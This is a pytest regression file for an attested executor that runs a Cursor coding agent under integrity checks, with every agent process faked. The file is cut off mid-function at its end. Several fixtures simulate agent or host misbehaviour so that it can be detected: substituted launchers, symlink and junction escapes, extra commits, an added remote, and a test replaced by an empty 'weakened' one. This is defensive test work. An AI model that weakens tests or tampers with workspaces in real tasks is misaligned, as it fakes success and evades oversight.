"""Act-2A native executor regressions; every agent process is deterministic fake code."""

from __future__ import annotations

from dataclasses import dataclass, field
import hashlib
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import re
from typing import Callable

import pytest

from admissible.delegated_gate.canonical import fingerprint
from admissible.delegated_gate.native_canary import (
    CANARY_MISSION,
    EXPECTED_MATERIAL_PATHS,
    NativeCanaryCoordinator,
    NativeCanaryStatus,
    REQUIRED_COMMIT_MESSAGE,
    build_authorization_payload,
    build_canary_repository,
    build_native_agent_prompt,
    create_canary_session,
    load_behavioral_verifier,
    main,
    run_behavioral_verifier,
)
from admissible.delegated_gate.native_executor import (
    ATTESTATION_SCHEMA_VERSION,
    BACKEND_IDENTITY,
    BACKEND_PROTOCOL_VERSION,
    AtomicNativeExecutionStore,
    CursorInstallationProvenance,
    CursorNativeBackendConfig,
    CURSOR_DISCOVERY_COMMAND,
    CURSOR_DISCOVERY_MECHANISM,
    EXPECTED_CURSOR_PACKAGE_NAME,
    NativeBackendAttestation,
    NativeBackendFileAttestation,
    NativeCanaryTerminalRecord,
    NativeCaptureTerminalStatus,
    NativeCommittedButDurabilityUncertain,
    NativeDelegatedExecutor,
    NativeEvidenceInvalid,
    NativeExecutionRequest,
    NativeExecutionResult,
    NativeExecutionStatus,
    NativeFilesystemIdentity,
    NativePreflightStatus,
    NativeProcessInvocation,
    NativeProcessOutcome,
    NativeResultAlreadyExists,
    OBSERVATION_PROVEN_EMPTY,
    preflight_native_cursor,
)
from admissible.delegated_gate.state import Phase
from admissible.delegated_gate.store import AtomicDelegatedSessionStore


def _command(argv: list[str], *, cwd: Path, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    return subprocess.run(argv, cwd=cwd, env=env, shell=False, check=True, capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=60)


def _commit(repository: Path, message: str) -> None:
    env = dict(os.environ)
    env.update({"GIT_AUTHOR_NAME": "Deterministic Fake Executor", "GIT_AUTHOR_EMAIL": "fake@invalid.example", "GIT_COMMITTER_NAME": "Deterministic Fake Executor", "GIT_COMMITTER_EMAIL": "fake@invalid.example", "GIT_AUTHOR_DATE": "2026-01-02T00:00:00Z", "GIT_COMMITTER_DATE": "2026-01-02T00:00:00Z"})
    _command(["git", "add", "--all"], cwd=repository); _command(["git", "commit", "--quiet", "-m", message], cwd=repository, env=env)


def _materialize_success(repository: Path) -> None:
    (repository / "src" / "score.js").write_text("""export function normalizeScore(value) {
  if (!Number.isSafeInteger(value) || value < 0) throw new TypeError('score must be a non-negative safe integer');
  return value;
}

export function higherScore(left, right) { return Math.max(normalizeScore(left), normalizeScore(right)); }
export function loadHighScore(storage, key = 'highScore') {
  const raw = storage.getItem(key);
  return raw === null ? 0 : normalizeScore(Number(raw));
}
export function persistHighScore(storage, score, key = 'highScore') {
  const next = higherScore(loadHighScore(storage, key), score);
  storage.setItem(key, String(next));
  return next;
}
""", encoding="utf-8", newline="\n")
    (repository / "src" / "game-state.js").write_text("""import { normalizeScore, persistHighScore } from './score.js';
export function createGameState(storage) { return { score: 0, rounds: 0, highScore: persistHighScore(storage, 0) }; }
export function finishRound(state, score, storage) {
  const normalized = normalizeScore(score);
  return { score: normalized, rounds: state.rounds + 1, highScore: persistHighScore(storage, normalized) };
}
""", encoding="utf-8", newline="\n")
    (repository / "test" / "game-state.test.js").write_text("""import test from 'node:test';
import assert from 'node:assert/strict';
import { createGameState, finishRound } from '../src/game-state.js';
import { createMemoryStorage } from '../src/memory-storage.js';
test('high score persists', () => {
  const storage = createMemoryStorage();
  assert.equal(finishRound(createGameState(storage), 7, storage).highScore, 7);
});
""", encoding="utf-8", newline="\n")
    (repository / "README.md").write_text("# Canary game state\n\nHigh-score persistence is deterministic.\n", encoding="utf-8", newline="\n")
    _commit(repository, REQUIRED_COMMIT_MESSAGE)


def _mutate_without_feature(repository: Path) -> None:
    (repository / "src" / "score.js").write_text((repository / "src" / "score.js").read_text(encoding="utf-8") + "\n// unrelated\n", encoding="utf-8")
    (repository / "src" / "game-state.js").write_text((repository / "src" / "game-state.js").read_text(encoding="utf-8") + "\n// unrelated\n", encoding="utf-8")
    (repository / "test" / "game-state.test.js").write_text("import test from 'node:test'; test('weakened', () => {});\n", encoding="utf-8")
    (repository / "README.md").write_text("# unrelated\n", encoding="utf-8")
    _commit(repository, REQUIRED_COMMIT_MESSAGE)


@dataclass
class FakeNativeProcessRunner:
    mutation: Callable[[Path], None] | None = _materialize_success
    returncode: int | None = 0
    timed_out: bool = False
    cleanup_confirmed: bool = True
    orphan_process_ids: tuple[int, ...] = ()
    stdout: str = "provider prose is non-authoritative\n"
    invocations: list[NativeProcessInvocation] = field(default_factory=list)
    def run(self, invocation: NativeProcessInvocation) -> NativeProcessOutcome:
        self.invocations.append(invocation)
        if self.mutation: self.mutation(Path(invocation.cwd))
        return NativeProcessOutcome(self.returncode, self.stdout, "", self.timed_out, self.cleanup_confirmed, OBSERVATION_PROVEN_EMPTY if self.cleanup_confirmed else "unknown", "hard_timeout" if self.timed_out else "completed", self.orphan_process_ids, len(self.stdout.encode()), 0, False)


class Clock:
    def __init__(self) -> None: self.values=iter(("2026-07-16T10:00:00.000000Z","2026-07-16T10:00:01.000000Z","2026-07-16T10:00:02.000000Z"))
    def __call__(self) -> str: return next(self.values)


@dataclass
class Harness:
    root: Path; source: Path; work: Path; evidence: Path; config: CursorNativeBackendConfig; attestation: object; runner: FakeNativeProcessRunner; store: AtomicNativeExecutionStore; session_store: AtomicDelegatedSessionStore; executor: NativeDelegatedExecutor; coordinator: NativeCanaryCoordinator; session_id: str


def _fake_cursor_launcher(path: Path) -> None:
    path.write_text("""import sys
if '--version' in sys.argv:
 print('Cursor fake 1.0'); raise SystemExit(0)
if '--help' in sys.argv:
 print('--print --force --output-format stream-json --trust --model'); raise SystemExit(0)
raise SystemExit(91)
""", encoding="utf-8")


def _fake_cursor_executable(directory: Path, *, name: str = "cursor-agent-test") -> Path:
    source = Path(sys.executable).resolve()
    executable = directory / f"{name}{source.suffix}"
    shutil.copy2(source, executable)
    return executable


def _test_identity(path: Path) -> NativeFilesystemIdentity:
    return NativeFilesystemIdentity.from_stat(os.lstat(path)).validated()


def _test_attestation(config: CursorNativeBackendConfig, installation: Path) -> NativeBackendAttestation:
    """Explicit injected attestation for deterministic executor tests only.

    It is intentionally never passed to ``preflight_native_cursor``.  The
    production preflight independently requires the host-discovered Cursor
    installation chain, so copied Python and a test launcher cannot acquire
    production-ready status.
    """

    package = installation / "package"
    manifest_path = package / "package.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    relative = manifest["bin"][CURSOR_DISCOVERY_COMMAND]
    launcher = package / relative
    executable = package / "node.exe"
    capability = (installation / "capabilities.txt").read_bytes()
    flags = tuple(sorted(set(re.findall(rb"--[A-Za-z0-9-]+", capability))))
    advertised = tuple(item.decode("ascii") for item in flags)
    required = {"--print", "--force", "--output-format", "--trust", "--model"}
    if not required.issubset(advertised):
        raise ValueError("injected attestation lacks a required advertised argument")
    if str(executable) != config.executable or tuple(config.launcher_prefix) != (str(launcher),):
        raise ValueError("injected test attestation configuration differs from installation")
    provenance = CursorInstallationProvenance(
        discovery_mechanism=CURSOR_DISCOVERY_MECHANISM,
        discovered_shim=NativeBackendFileAttestation.observe(installation / "cursor-agent.cmd", "test shim"),
        installation_root=str(installation),
        installation_root_identity=_test_identity(installation),
        package_root=str(package),
        package_root_identity=_test_identity(package),
        package_manifest=NativeBackendFileAttestation.observe(manifest_path, "test manifest"),
        package_name=EXPECTED_CURSOR_PACKAGE_NAME,
        bin_command=CURSOR_DISCOVERY_COMMAND,
        bin_relative_path=relative,
        launcher=NativeBackendFileAttestation.observe(launcher, "test launcher"),
    ).validated()
    executable_attestation = NativeBackendFileAttestation.observe(executable, "test executable")
    launcher_prefix = (provenance.launcher,)
    argv = (executable_attestation.canonical_path, provenance.launcher.canonical_path)
    version = b"Cursor injected deterministic test runtime\n"
    provisional = NativeBackendAttestation(
        schema_version=ATTESTATION_SCHEMA_VERSION,
        backend_identity=BACKEND_IDENTITY,
        backend_protocol_version=BACKEND_PROTOCOL_VERSION,
        executable=executable_attestation,
        launcher_prefix=launcher_prefix,
        provenance=provenance,
        version_probe_argv=(*argv, "--version"),
        help_probe_argv=(*argv, "--help"),
        version_probe_exit_code=0,
        help_probe_exit_code=0,
        version_stdout_sha256=hashlib.sha256(version).hexdigest(),
        version_stderr_sha256=hashlib.sha256(b"").hexdigest(),
        help_stdout_sha256=hashlib.sha256(capability).hexdigest(),
        help_stderr_sha256=hashlib.sha256(b"").hexdigest(),
        advertised_flags=advertised,
        static_argv_template=(*argv, "--print", "--output-format", "stream-json", "--force", "--trust", "--model", config.model, "{prompt}"),
        selected_model=config.model,
        environment_allowlist=config.environment_allowlist,
        attestation_fingerprint="0" * 64,
    )
    return NativeBackendAttestation(**{**provisional.__dict__, "attestation_fingerprint": fingerprint(provisional._body())}).validated()


def _injected_test_cursor(tmp_path: Path) -> tuple[CursorNativeBackendConfig, Callable[[CursorNativeBackendConfig], NativeBackendAttestation]]:
    installation = tmp_path / "injected-test-installation"
    package = installation / "package"
    package.mkdir(parents=True)
    (installation / "cursor-agent.cmd").write_text("@rem injected test shim\n", encoding="utf-8")
    launcher = package / "index.py"
    _fake_cursor_launcher(launcher)
    executable = _fake_cursor_executable(package, name="node")
    if executable.name != "node.exe":
        executable.rename(package / "node.exe")
    (package / "package.json").write_text(json.dumps({"name": EXPECTED_CURSOR_PACKAGE_NAME, "bin": {CURSOR_DISCOVERY_COMMAND: "index.py"}}), encoding="utf-8")
    (installation / "capabilities.txt").write_text("--print --force --output-format stream-json --trust --model", encoding="utf-8")
    config = CursorNativeBackendConfig(executable=str((package / "node.exe").resolve()), launcher_prefix=(str(launcher.resolve()),))
    return config, lambda configured: _test_attestation(configured, installation)


def _harness(tmp_path: Path, *, runner: FakeNativeProcessRunner | None = None, directory_sync: Callable[[Path], None] | None = None) -> Harness:
    source_parent=tmp_path/"source-parent"; source_parent.mkdir(); source=build_canary_repository(source_parent,repository_name="source").repository
    root=tmp_path/"run"; root.mkdir(); work=build_canary_repository(root).repository; evidence=root/"evidence"; evidence.mkdir()
    config, attestor = _injected_test_cursor(tmp_path)
    attestation = attestor(config)
    fake=runner or FakeNativeProcessRunner(); store=AtomicNativeExecutionStore(evidence/"native-execution",directory_sync=directory_sync or (lambda _: None)); session_store=AtomicDelegatedSessionStore(evidence/"delegated-state")
    session_id="native-canary-session"; session_store.create(create_canary_session(session_id=session_id)); executor=NativeDelegatedExecutor(config=config,process_runner=fake,clock=Clock(),local_attestor=attestor)
    coordinator=NativeCanaryCoordinator(session_store=session_store,execution_store=store,executor=executor,backend_attestation=attestation,source_repository=source,work_workspace=work,canary_parent=root,evidence_directory=evidence,timeout_seconds=30,stdout_byte_limit=4096,stderr_byte_limit=2048)
    return Harness(root,source,work,evidence,config,attestation,fake,store,session_store,executor,coordinator,session_id)


def _request(h: Harness) -> tuple[NativeExecutionRequest,str]:
    state=h.session_store.load(h.session_id); prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work)
    return NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=h.work,evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,attestation=h.attestation,prompt=prompt,timeout_seconds=30,stdout_byte_limit=4096,stderr_byte_limit=2048),prompt


def test_fixture_is_deterministic_clean_one_commit_and_dependency_free(tmp_path: Path):
    left_root=tmp_path/"left"; right_root=tmp_path/"right"; left_root.mkdir(); right_root.mkdir(); left=build_canary_repository(left_root); right=build_canary_repository(right_root)
    assert left.initial_head==right.initial_head and left.initial_material_tree_hash==right.initial_material_tree_hash
    assert _command(["git","status","--porcelain=v1"],cwd=left.repository).stdout==""
    package=json.loads((left.repository/"package.json").read_text(encoding="utf-8")); assert package["scripts"]=={"test":"node --preserve-symlinks --preserve-symlinks-main --test"}; assert "dependencies" not in package


def test_local_attestation_rejects_python_plus_fake_js_launcher(tmp_path: Path):
    fake_js=tmp_path/"fake.js"; _fake_cursor_launcher(fake_js)
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str(Path(sys.executable).resolve()),launcher_prefix=(str(fake_js.resolve()),)))
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED


def test_missing_advertised_flag_blocks_without_provider(tmp_path: Path):
    launcher=tmp_path/"cursor.py"; launcher.write_text("import sys\nprint('--print --force --output-format stream-json --trust')\n",encoding="utf-8")
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str(_fake_cursor_executable(tmp_path).resolve()),launcher_prefix=(str(launcher.resolve()),)))
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED


def test_actual_local_cursor_installation_without_manifest_bin_chain_fails_closed() -> None:
    shim=shutil.which("cursor-agent")
    if shim is None:
        pytest.skip("Cursor Agent is not locally installed")
    installation=Path(shim).resolve().parent
    versions=installation/"versions"
    candidates=sorted((item for item in versions.iterdir() if item.is_dir()),key=lambda item:item.name) if versions.is_dir() else []
    if not candidates or not (candidates[-1]/"node.exe").is_file() or not (candidates[-1]/"index.js").is_file():
        pytest.skip("local Cursor distribution has no inspectable Node runtime layout")
    package=candidates[-1]
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str((package/"node.exe").resolve()),launcher_prefix=(str((package/"index.js").resolve()),)))
    # This local distribution currently declares its runtime package name but
    # no manifest bin mapping.  It must block before any version/help process.
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED
    assert "bin" in decision.detail.lower()


@pytest.mark.parametrize("manifest, launcher_name", [
    ({"name": EXPECTED_CURSOR_PACKAGE_NAME, "bin": {CURSOR_DISCOVERY_COMMAND: "other.py"}}, "index.py"),
    ({"name": EXPECTED_CURSOR_PACKAGE_NAME, "bin": {CURSOR_DISCOVERY_COMMAND: "index.py"}}, "outside.py"),
    ({"name": "cursor-looking-fake", "bin": {CURSOR_DISCOVERY_COMMAND: "index.py"}}, "index.py"),
])
def test_production_preflight_rejects_fake_manifest_and_launcher_chains(tmp_path: Path, manifest: dict[str, object], launcher_name: str):
    package=tmp_path/"fake-package"; package.mkdir(); launcher=package/launcher_name; _fake_cursor_launcher(launcher)
    (package/"package.json").write_text(json.dumps(manifest),encoding="utf-8")
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str(_fake_cursor_executable(package,name="node").resolve()),launcher_prefix=(str(launcher.resolve()),)))
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED


def test_request_round_trip_is_attestation_bound_and_attempt_one_is_rejected(tmp_path: Path):
    h=_harness(tmp_path); request,_=_request(h); assert NativeExecutionRequest.from_dict(json.loads(json.dumps(request.to_dict())))==request
    raw=request.to_dict(); raw["execution_attempt_index"]=1; raw["request_fingerprint"]=fingerprint({key:value for key,value in raw.items() if key!="request_fingerprint"})
    with pytest.raises(ValueError): NativeExecutionRequest.from_dict(raw)


def test_inert_request_parse_needs_fresh_local_attestation_before_execution(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); raw=request.to_dict()
    attestation=raw["backend_attestation"]
    attestation["advertised_flags"]= ["--alternate", "--force", "--model", "--output-format", "--print", "--trust"]
    attestation["attestation_fingerprint"]=fingerprint({key:value for key,value in attestation.items() if key!="attestation_fingerprint"})
    raw["backend_attestation_fingerprint"]=attestation["attestation_fingerprint"]
    raw["request_fingerprint"]=fingerprint({key:value for key,value in raw.items() if key!="request_fingerprint"})
    parsed=NativeExecutionRequest.from_dict(raw)
    with pytest.raises(NativeEvidenceInvalid,match="freshly attested"):
        parsed.validated_for_execution(current_attestation=h.attestation)
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=parsed,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations==[]


def test_substituted_manifest_or_launcher_identity_cannot_reload_as_authority(tmp_path: Path):
    h=_harness(tmp_path); request,_=_request(h); raw=request.to_dict(); manifest=tmp_path/"injected-test-installation"/"package"/"package.json"
    manifest.write_text(json.dumps({"name":"wrong-package","bin":{CURSOR_DISCOVERY_COMMAND:"index.py"}}),encoding="utf-8")
    with pytest.raises(ValueError): NativeExecutionRequest.from_dict(raw)
    # Restore a structurally valid manifest, then prove a changed mapped
    # launcher is likewise rejected before an executor can be entered.
    manifest.write_text(json.dumps({"name":EXPECTED_CURSOR_PACKAGE_NAME,"bin":{CURSOR_DISCOVERY_COMMAND:"index.py"}}),encoding="utf-8")
    Path(h.config.launcher_prefix[0]).write_text("print('substituted launcher')\n",encoding="utf-8")
    with pytest.raises(ValueError): NativeExecutionRequest.from_dict(raw)


def test_changed_launcher_before_spawn_blocks_without_fake_process(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); Path(h.attestation.launcher_prefix[0].canonical_path).write_text("print('changed')\n",encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations==[]


def test_changed_help_capability_evidence_blocks_before_spawn(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h)
    (tmp_path/"injected-test-installation"/"capabilities.txt").write_text("--print --output-format stream-json --trust --model",encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations==[]


def test_changed_copied_executable_after_request_blocks_when_platform_can_launch_copy(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); executable=Path(h.config.executable); executable.write_bytes(executable.read_bytes()+b"x")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    assert h.runner.invocations==[]


def test_plain_deserialized_and_lookalike_results_cannot_be_written(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    with pytest.raises(NativeEvidenceInvalid,match="executor-issued"):
        h.store.write_result(object())
    issued=h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)
    result=h.store.write_result(issued); assert result.status is NativeExecutionStatus.PROCESS_SUCCEEDED
    with pytest.raises(NativeEvidenceInvalid): h.store.write_result(issued)
    with pytest.raises(Exception): h.store.create_request(request)


def test_recomputed_contradictory_result_is_rejected(tmp_path: Path):
    h=_harness(tmp_path); outcome=h.coordinator.run(session_id=h.session_id); assert outcome.canary_success
    result=h.store.load_result(h.session_id,"native-canary-gate",0); raw=result.to_dict(); raw["source_tree_hash_after"]="f"*64; raw["source_repository_mutated"]=False
    raw["result_fingerprint"]=fingerprint({key:value for key,value in raw.items() if key!="result_fingerprint"})
    with pytest.raises(ValueError,match="source mutation flag"):
        NativeExecutionResult.from_dict(raw)


@pytest.mark.parametrize(("field", "value", "message"), [
    ("commits_added", 0, "commit count"),
    ("changed_material_files", [], "changed paths"),
    ("final_commit_message", "contradictory message", "final workspace/Git"),
])
def test_self_fingerprinted_git_success_claims_are_recomputed(tmp_path: Path, field: str, value: object, message: str):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    result=h.store.write_result(h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory))
    raw=result.to_dict(); raw[field]=value; raw["result_fingerprint"]=fingerprint({key:item for key,item in raw.items() if key!="result_fingerprint"})
    with pytest.raises(ValueError,match=message): NativeExecutionResult.from_dict(raw)


def test_workspace_git_change_after_result_publication_fails_reloaded_authority(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    h.store.write_result(h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory))
    (h.work/"README.md").write_text("changed after result\n",encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid,match="invalid"):
        h.store.load_result(h.session_id,"native-canary-gate",0)


def test_result_artifact_tamper_and_escape_fail_closed(tmp_path: Path):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success; result=h.store.load_result(h.session_id,"native-canary-gate",0)
    artifact=h.store.directory/result.stdout_artifact.relative_path; artifact.write_bytes(artifact.read_bytes()+b"tamper")
    with pytest.raises(NativeEvidenceInvalid,match="hash"):
        h.store.load_result(h.session_id,"native-canary-gate",0)


def test_symlinked_workspace_and_source_workspace_are_refused(tmp_path: Path):
    h=_harness(tmp_path)
    link=tmp_path/"work-link"
    try: os.symlink(h.work,link,target_is_directory=True)
    except (OSError,NotImplementedError): pytest.skip("symlinks unavailable")
    state=h.session_store.load(h.session_id)
    with pytest.raises(ValueError): NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=link,evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,attestation=h.attestation,prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work),timeout_seconds=30,stdout_byte_limit=10,stderr_byte_limit=10)
    request,prompt=_request(h)
    with pytest.raises(NativeEvidenceInvalid): h.executor.execute(request=request,prompt=prompt,source_repository=h.work,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory)


def test_real_windows_junction_workspace_and_evidence_root_are_refused(tmp_path: Path):
    if os.name != "nt": pytest.skip("Windows junction regression")
    h=_harness(tmp_path); junction=tmp_path/"junction"
    completed=subprocess.run(["cmd.exe","/d","/c","mklink","/J",str(junction),str(h.work)],shell=False,capture_output=True)
    if completed.returncode != 0: pytest.skip("junction creation unavailable")
    state=h.session_store.load(h.session_id); prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work)
    with pytest.raises(ValueError): NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=junction,evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,attestation=h.attestation,prompt=prompt,timeout_seconds=30,stdout_byte_limit=10,stderr_byte_limit=10)
    evidence_link=tmp_path/"evidence-junction"; completed=subprocess.run(["cmd.exe","/d","/c","mklink","/J",str(evidence_link),str(h.evidence)],shell=False,capture_output=True)
    if completed.returncode == 0:
        with pytest.raises(ValueError): AtomicNativeExecutionStore(evidence_link/"store",directory_sync=lambda _:None)


def test_redirecting_artifact_destination_blocks_before_fake_process(tmp_path: Path):
    h=_harness(tmp_path); destination=h.store.directory/"redirecting-artifacts"
    try: destination.symlink_to(tmp_path,target_is_directory=True)
    except (OSError,NotImplementedError): pytest.skip("symlinks unavailable")
    request,prompt=_request(h)
    with pytest.raises(ValueError):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=destination)
    assert h.runner.invocations==[]


@pytest.mark.parametrize("kind", ["outside", "sibling", "workspace"])
def test_artifact_root_is_bound_and_rejected_before_request_or_process(tmp_path: Path, kind: str):
    h=_harness(tmp_path); state=h.session_store.load(h.session_id); prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work)
    if kind == "outside":
        artifact=tmp_path/"outside"; artifact.mkdir()
    elif kind == "sibling":
        artifact=h.store.directory.parent/"sibling-artifacts"; artifact.mkdir()
    else:
        artifact=h.work/"agent-artifacts"; artifact.mkdir()
    with pytest.raises((ValueError,NativeEvidenceInvalid)):
        NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=h.work,evidence_store_root=h.store.directory,artifact_directory=artifact,attestation=h.attestation,prompt=prompt,timeout_seconds=30,stdout_byte_limit=1024,stderr_byte_limit=1024)
    assert h.runner.invocations==[]


def test_evidence_root_replacement_blocks_before_fake_process(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    original=h.store.directory; displaced=original.parent/"displaced-native-evidence"; original.rename(displaced); original.mkdir(); (original/"artifacts").mkdir()
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=original,artifact_directory=original/"artifacts")
    assert h.runner.invocations==[]


def test_nested_existing_sibling_mutation_is_detected(tmp_path: Path):
    h=_harness(tmp_path); sibling=h.root/"sibling"; sibling.mkdir(); (sibling/"inside.txt").write_text("before",encoding="utf-8")
    def mutate(work: Path) -> None: _materialize_success(work); (sibling/"inside.txt").write_text("after",encoding="utf-8")
    h.runner.mutation=mutate; outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED and h.session_store.load(h.session_id).phase is Phase.GATE_EXECUTING


def test_directory_durability_uncertainty_blocks_before_provider(tmp_path: Path):
    def fail(_: Path) -> None: raise OSError("directory flush unsupported")
    h=_harness(tmp_path,directory_sync=fail); outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.DURABILITY_UNCERTAIN and h.runner.invocations==[]


def test_behavioral_record_directory_durability_uncertainty_is_visible_and_never_captures(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    calls={"sync":0,"capture":0}
    def sync(_: Path) -> None:
        calls["sync"]+=1
        if calls["sync"] == 6: raise OSError("behavioral record directory fsync failed")
    h=_harness(tmp_path,directory_sync=sync)
    def capture(**kwargs: object) -> object:
        calls["capture"]+=1
        raise AssertionError("checkpoint must not be reached after behavioral durability uncertainty")
    monkeypatch.setattr("admissible.delegated_gate.native_canary.capture_checkpoint",capture)
    first=h.coordinator.run(session_id=h.session_id); second=h.coordinator.run(session_id=h.session_id)
    assert first.status is NativeCanaryStatus.DURABILITY_UNCERTAIN and second.status is NativeCanaryStatus.DURABILITY_UNCERTAIN
    assert h.store.has_behavioral_evidence(h.session_id,"native-canary-gate",0) and calls["capture"]==0


@pytest.mark.parametrize("runner,expected",[(FakeNativeProcessRunner(mutation=None,timed_out=True,returncode=None),NativeCanaryStatus.TIMED_OUT),(FakeNativeProcessRunner(mutation=None,returncode=7),NativeCanaryStatus.PROCESS_FAILED),(FakeNativeProcessRunner(mutation=None,cleanup_confirmed=False),NativeCanaryStatus.CLEANUP_UNCERTAIN)])
def test_process_failure_boundaries_create_terminal_without_checkpoint(tmp_path: Path,runner: FakeNativeProcessRunner,expected: NativeCanaryStatus):
    h=_harness(tmp_path,runner=runner); outcome=h.coordinator.run(session_id=h.session_id); assert outcome.status is expected or outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED
    assert h.session_store.load(h.session_id).phase is Phase.GATE_EXECUTING


def test_zero_exit_without_commit_never_captures_checkpoint(tmp_path: Path):
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=None)); outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED; assert h.session_store.load(h.session_id).checkpoint_history==()


def test_wrong_message_extra_commit_dirty_tree_remote_and_missing_path_all_block_before_checkpoint(tmp_path: Path):
    cases=[]
    def wrong(work: Path) -> None: _materialize_success(work); (work/"README.md").write_text("wrong message\n",encoding="utf-8"); _commit(work,"wrong")
    def extra(work: Path) -> None: _materialize_success(work); (work/"extra.txt").write_text("x",encoding="utf-8"); _commit(work,"extra")
    def dirty(work: Path) -> None: _materialize_success(work); (work/"dirty.txt").write_text("x",encoding="utf-8")
    def remote(work: Path) -> None: _materialize_success(work); _command(["git","remote","add","origin","https://invalid.example/repo.git"],cwd=work)
    def missing(work: Path) -> None: _materialize_success(work); _command(["git","reset","--soft","HEAD~1"],cwd=work); _command(["git","checkout","HEAD","--","README.md"],cwd=work); _commit(work,REQUIRED_COMMIT_MESSAGE)
    for mutation in (wrong,extra,dirty,remote,missing):
        case_root=tmp_path/str(len(cases)); case_root.mkdir()
        h=_harness(case_root,runner=FakeNativeProcessRunner(mutation=mutation)); cases.append(h.coordinator.run(session_id=h.session_id)); assert h.session_store.load(h.session_id).checkpoint_history==()
    assert all(item.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED for item in cases)


def test_mutable_tests_cannot_self_certify_and_behavioral_evidence_is_fingerprinted(tmp_path: Path):
    h=_harness(tmp_path,runner=FakeNativeProcessRunner(mutation=_mutate_without_feature)); outcome=h.coordinator.run(session_id=h.session_id)
